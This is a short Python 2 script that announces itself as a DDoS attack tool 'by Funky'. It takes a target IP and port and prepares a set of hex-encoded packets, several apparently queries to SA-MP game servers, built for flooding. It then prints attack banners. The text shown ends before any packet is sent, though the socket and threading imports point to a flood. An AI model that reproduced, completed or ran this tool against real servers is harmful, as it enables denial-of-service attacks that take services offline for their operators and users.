import socket, struct, codecs, sys, threading, random, time, os
ip = sys.argv[1]
port = sys.argv[2]
orgip = ip
Pacotes = [
codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
codecs.decode('081e62da', 'hex_codec'),
codecs.decode('081e77da', 'hex_codec'),
codecs.decode('081e4dda', 'hex_codec'),
codecs.decode('081efd40', 'hex_codec'),
codecs.decode('081e7eda', 'hex_codec')]
print ' TOLS DDOS ATTACK BY FUNKY'
print ' attack By Funky to ip %s port %s   ' % (orgip, port)
print ' Easy Down'